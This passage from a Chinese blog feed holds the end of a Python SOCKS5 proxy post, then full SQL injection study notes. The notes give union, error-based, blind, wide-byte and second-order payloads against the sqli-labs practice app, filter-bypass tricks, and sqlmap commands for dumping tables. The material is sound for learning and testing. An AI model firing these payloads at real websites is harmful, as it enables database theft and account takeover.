    <span class="token keyword">with</span> ThreadingTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9011</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SocksProxy<span class="token punctuation">)</span> <span class="token keyword">as</span> server<span class="token punctuation">:</span>
        server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>客户端</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> socks
<span class="token keyword">import</span> requests
socks<span class="token punctuation">.</span>set_default_proxy<span class="token punctuation">(</span>socks<span class="token punctuation">.</span>SOCKS5<span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">9011</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
socket<span class="token punctuation">.</span>socket <span class="token operator">=</span> socks<span class="token punctuation">.</span>socksocket
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参考：</p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/SOCKS">https://zh.wikipedia.org/wiki/SOCKS</a></p>
<p><a href="https://www.ietf.org/rfc/rfc1928.txt">https://www.ietf.org/rfc/rfc1928.txt</a></p>
<p><a href="https://rushter.com/blog/python-socks-server/">https://rushter.com/blog/python-socks-server/</a></p>
<p><a href="https://www.quarkay.com/code/383/socks5-protocol-rfc-chinese-traslation">RFC 1928 - SOCKS5 协议中文文档</a></p>
<p><a href="https://hatboy.github.io/2018/04/28/Python%E7%BC%96%E5%86%99socks5%E6%9C%8D%E5%8A%A1%E5%99%A8/#">Python编写socks5服务器</a></p>
<p><a href="https://jiajunhuang.com/articles/2019_06_06-socks5.md.html">socks5 协议详解</a></p>
</blockquote>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>socks5</tag>
        <tag>proxy</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入学习笔记</title>
    <url>/2020/06/05/sql-zhu-ru-xue-xi-bi-ji/</url>
    <content><![CDATA[<p>开始web学习</p>
<span id="more"></span>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>在MySQL 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有schemata（数据库名）、tables（表名）、columns（列名或字段名）。</p>
<p>在schemata表中，schema_name字段用来存储数据库名。</p>
<p>在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
<p>在columns表中，tanle_schema（数据库名）、table_name（表名）、column_name（字段名）</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释符：在MySQL中常见的注释符表达式：#，—空格，/**/</p>
<p>内联注释：<code>/*! SQL语句 */</code> 只有MySQL可以识别，常用于绕过WAF</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 例：
select * from user where id &#x3D; id;
# 使用内联注释注入：
select * from user where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>一般用户登陆所用的SQL语句为：<code>SELECT * FROM user WHERE username= &#39;admin&#39; and password=&#39;passwd&#39;</code>，若对用户输入的用户名和密码无处理，则可构造万能密码绕过验证‘ or 1 #，SQL语句就变为：<code>SELECT * FROM user WHERE username= &#39;&#39; or 1 # and password=&#39; &#39;</code>，#号后注释。</p>
<h1 id="SQL注入分类及判断"><a href="#SQL注入分类及判断" class="headerlink" title="SQL注入分类及判断"></a>SQL注入分类及判断</h1><ol>
<li>数据类型<ul>
<li>数字型</li>
<li>字符型</li>
<li>搜索型</li>
</ul>
</li>
<li>提交方式<ul>
<li>GET型</li>
<li>POST型</li>
<li>Cookie型</li>
<li>HTTP请求头注入</li>
</ul>
</li>
<li>执行效果<ul>
<li>报错注入</li>
<li>联合查询注入</li>
<li>堆叠查询注入</li>
<li>盲注<ul>
<li>基于bool</li>
<li>基于时间</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>数字型注入查询语句为：<code>SELECT * FROM user WHERE id=1</code>,搜索型注入为查询语句为：<code>SELECT * FROM user WHERE search like &#39;%1%&#39;</code>。</p>
<p>在URL或者表单中输入0 or 1，如果可以查到数据，说明是数字型注入，如果输入0’or 1#，查到数据说明是字符型注入，方法不唯一。</p>
<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p>使用联合查询时，必须使得两张表的表结构一致<br>构造联合注入语句：<code>1&#39; order by 1#</code> or <code>1&#39; order by 2#</code><br>构造联合查询语句：<code>&#39;union select 1,2#</code><br>以上构造可查询表的列数</p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>Blind SQL是注入攻击的其中一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果。这种攻击的出现是应为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题</p>
<p>当攻击者利用SQL注入漏洞进行攻击时，有时候web应用程序会显示，后端数据库执行SQL查询返回的错误信息。盲注与常规注入很接近，不同的是数据库返回数据的检索方式。若书库没有输出数据到web页面，攻击者会询问一系列的true或false问题，强制从数据库获取数据</p>
<h2 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h2><p>通常使用函数length()，返回长度；ascii()，返回ASCII值；substr(string,a,b)，返回string以a开头，长度为b的字符串；count()，返回数量。</p>
<p>在存在注入的注入点参数后使用if判断正确或错误的语句</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select length(database());
select substr(database(),1,1);
select ascii(substr(database(),1,1));
select ascii(substr(database(),1,1)) &gt; N;
select ascii(substr(database(),1,1)) &#x3D; N;
select ascii(substr(database(),1,1)) &lt; N;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>除了需使用以上函数之外，一般还使用延时函数sleep()，if(c,a,b)等等。</p>
<p>在存在注入的注入点参数后使用<code>if(length(database())&gt;5,sleep(5),null)</code>，如果执行的页面响应时间大于5秒，那么存在注入，并且对相应的SQL语句执行。</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入形式上是两个嵌套的查询，即select…(select…)，里面的select被称为子查询，他执行的顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p>
<ul>
<li>rand()随机函数，返回0~1之间的某个值</li>
<li>floor(a)取整函数，返回小于等于a，且最接近a的一个整数</li>
<li>count()聚合函数，也成计数函数，返回查询对象的总数</li>
<li>group by clause分组函数，按照查询结果分组</li>
</ul>
<p>通过报错来显示具体的信息</p>
<p>查询的时候如果使用rand()的话，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果续表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中 floor(rand(0)*2)的值是定值，为011011</p>
<p>select count(*) from table group by floor(rand(0)*2);</p>
<p>例：sqli Less5</p>
<p>获取数据库</p>
<p><code>http://127.0.0.1/sqli/Less-5/?id=0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a)limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</code></p>
<p>获取表名</p>
<p><code>http://127.0.0.1/sqli/Less-5/?id=0&#39; union select 1,2,3 from (select count(*),concat((select concat(group_concat(table_name),0x3a,0x3a)from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</code></p>
<p>获取用户信息</p>
<p><code>http://127.0.0.1/sqli/Less-5/?id=0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</code></p>
<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>如果出现中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤</p>
<p>可以通过修改关键字内字母大小写来绕过过滤措施。例：AnD 1=1</p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>如果在程序设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。因为在过滤过程中只进行了一次替换，就是将关键字替换为空</p>
<p>例：过滤了union 只要发现union时，无论大小写都会被替换为空</p>
<p>ununionion，UnunionIon</p>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>可以利用网路中的url在线编码，绕过SQL注入的过滤机制</p>
<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>在Mysql中内联注释中的内容可以被当做SQL语句执行</p>
<h1 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h1><ol>
<li><p>判断是否存在SQL注入</p>
<p><code>1&#39; or 1 --+</code></p>
</li>
<li><p>利用order by判断字段数</p>
<p><code>1&#39; order by 1 --+</code> 或 <code>1&#39; order by 2 --+</code></p>
</li>
<li><p>利用union select联合查询，获取表名</p>
<p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
</li>
<li><p>利用union select联合查询，获取字段名</p>
<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
</li>
</ol>
<p>sqlmap：</p>
<ol>
<li><p>sqlmap -u “<a href="http://www.xx.com?id=x">http://www.xx.com?id=x</a>“    （查询是否存在注入点）</p>
</li>
<li><p>—dbs（检测站点包含哪些数据库）</p>
</li>
<li><p>—current-db（获取当前的数据库名）</p>
</li>
<li><p>-D “db_name” —tables（获取指定数据库中的表名 -D后接指定的数据库名称）</p>
</li>
<li><p>-D “db_name” -T “table_name” —columns（获取数据库表中的字段）</p>
</li>
<li><p>-D “db_name” -T “table_name” -C “columns_name” —dump (获取字段的数据内容)</p>
</li>
</ol>
<h1 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h1><h2 id="HTTP头中的注入介绍"><a href="#HTTP头中的注入介绍" class="headerlink" title="HTTP头中的注入介绍"></a>HTTP头中的注入介绍</h2><p>在安全意识越来越重视的情况下，很多网站都在防止漏洞的发生。例如在SQL注入中，用户提交的参数都会被代码中的某些措施进行过滤。</p>
<p>但是对于HTTP头中提交的内容很有可能就没有进行过滤。例如HTTP头中 User-Agent、Referer、Cookies等。</p>
<h2 id="HTTP-User-Agent注入"><a href="#HTTP-User-Agent注入" class="headerlink" title="HTTP  User-Agent注入"></a>HTTP  User-Agent注入</h2><p>sqli Less18</p>
<p>源文档语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>payload:<br>updatexml(xml document,xpath_string,new_value):<br>第一个参数：XML文档对象名称。<br>第二个参数：XPath字符串。<br>第三个参数：替换查找到的符合条件的数据。<br><code>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#39;1&#39;=&#39;1</code></p>
<h1 id="绕过去除特定字符的SQL注入"><a href="#绕过去除特定字符的SQL注入" class="headerlink" title="绕过去除特定字符的SQL注入"></a>绕过去除特定字符的SQL注入</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">mixed</span> <span class="token function">preg_replace</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$replacement</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$subject</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
<p>参数说明：</p>
<ul>
<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement: 用于替换的字符串或字符串数组。</li>
<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
<li>$count: 可选，为替换执行的次数。</li>
</ul>
<h2 id="去除注释符"><a href="#去除注释符" class="headerlink" title="去除注释符"></a>去除注释符</h2><p>代码示例：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span>
<span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span>
<span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>绕过策略：</p>
<p>利用<code>or &#39;1&#39; = &#39;1</code>闭合后面的单引号</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-23/?id=-1' union select 1,database(),'3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="去除and和or"><a href="#去除and和or" class="headerlink" title="去除and和or"></a>去除and和or</h2><p>代码示例：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>绕过策略：</p>
<ol>
<li>大小写变形，代码中大小写不敏感，都会被剔除</li>
<li>在这两个敏感词汇中添加注释，例如：a/**/nd 双写绕过oorr</li>
<li>利用符号替代：and—&amp;&amp;，or—||</li>
</ol>
<h2 id="去除空格"><a href="#去除空格" class="headerlink" title="去除空格"></a>去除空格</h2><p>代码示例：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//strip out OR (non case sensitive)</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//Strip out AND (non case sensitive)</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//strip out /*</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//Strip out --</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//Strip out #</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\s]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//Strip out spaces</span>
	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\\\\]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//Strip out slashes</span>
	<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>绕过策略：</p>
<p>编码：hex，urlencode</p>
<p>空格URL编码 %20、%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>GBK编码占用两字节<br>ASCII编码占用一字节<br>PHP中编码为GBK，函数执行添加的是ASCII编码，MySQL默认字符集是GBK等宽字节字符集。</p>
<p>%DF’：会被PHP当中的addslashes函数转义成为“%DF\\’”，“\\”既URL里的“%5C”，那么也就是说，“%DF”会被转成“%DF%5C%27”，若网站的字符集是GBK，MySQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。</p>
<p>代码分析：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>sqli Less33</p>
<p>payload: <code>id=%df&#39; --+</code></p>
<p>sqlmap: <code>sqlmap -u &quot;url?id=1%df%27&quot; --search --level 3 --risk 1</code></p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>最长是通的宽字节注入是利用%df，其实只要第一个ascii吗大于128就可以了，比如ascii吗为129的，将129（十进制）转换为十六进制，为0x81，然后在十六进制前加%即可，即为%81</p>
<p>GBK首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）</p>
<p>代码分析：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//escape any backslash</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">//escape single quote with a backslash</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\"/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\""</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">//escape double quote with a backslash   </span>
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>sqli Less32</p>
<p>payload: <code>id=%bf&#39; --+</code></p>
<p>sqlmap: <code>sqlmap -u &quot;url?id=1&quot; --tamper=unmagicquotes.py</code></p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p>sqli Less24</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>通过部分源代码得知，此处使用了<code>mysql_real_escape_string</code>进行转义，无法SQL注入</p>
<pre class="line-numbers language-none"><code class="language-none">注册
Username:admin&#39; -- -
Password:123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后登录发现可以更改密码，因为更改密码的操作是</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p>假设更改的密码是123456</p>
<p>此处执行的SQL语句为</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;123456&#39; where username=&#39;admin&#39; -- &#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p>即将admin的密码进行了更改</p>
<h1 id="MySQL注入常用函数"><a href="#MySQL注入常用函数" class="headerlink" title="MySQL注入常用函数"></a>MySQL注入常用函数</h1><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">函数名称</th>
<th style="text-align:center">函数功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">system_user()</td>
<td style="text-align:center">系统用户名</td>
</tr>
<tr>
<td style="text-align:center">user()</td>
<td style="text-align:center">用户名</td>
</tr>
<tr>
<td style="text-align:center">current_user()</td>
<td style="text-align:center">当前用户名</td>
</tr>
<tr>
<td style="text-align:center">session_user()</td>
<td style="text-align:center">连接数据库的用户名</td>
</tr>
<tr>
<td style="text-align:center">database()</td>
<td style="text-align:center">数据库名</td>
</tr>
<tr>
<td style="text-align:center">version()</td>
<td style="text-align:center">数据库版本</td>
</tr>
<tr>
<td style="text-align:center">@@datadir</td>
<td style="text-align:center">数据库路径</td>
</tr>
<tr>
<td style="text-align:center">@@basedir</td>
<td style="text-align:center">数据库安装路径</td>
</tr>
<tr>
<td style="text-align:center">@@version_compile_os</td>
<td style="text-align:center">操作系统</td>
</tr>
<tr>
<td style="text-align:center">count()</td>
<td style="text-align:center">返回执行结果数量········</td>
</tr>
<tr>
<td style="text-align:center">concat()</td>
<td style="text-align:center">没有分隔符的连接字符串</td>
</tr>
<tr>
<td style="text-align:center">concat_ws()</td>
<td style="text-align:center">含有分隔符的连接字符串</td>
</tr>
<tr>
<td style="text-align:center">group_concat</td>
<td style="text-align:center">连接一个组的所有字符串，并以逗号分隔每一条数据</td>
</tr>
<tr>
<td style="text-align:center">load_file()</td>
<td style="text-align:center">读取本地文件</td>
</tr>
<tr>
<td style="text-align:center">into outfile</td>
<td style="text-align:center">写文件</td>
</tr>
<tr>
<td style="text-align:center">ascii()</td>
<td style="text-align:center">字符串的ASCII代码值</td>
</tr>
<tr>
<td style="text-align:center">ord()</td>
<td style="text-align:center">返回字符串第一个字符的ACSCII值</td>
</tr>
<tr>
<td style="text-align:center">mid()</td>
<td style="text-align:center">返回一个字符串的一部分</td>
</tr>
<tr>
<td style="text-align:center">substr()</td>
<td style="text-align:center">返回一个字符串的一部分</td>
</tr>
<tr>
<td style="text-align:center">length()</td>
<td style="text-align:center">返回字符串的长度</td>
</tr>
<tr>
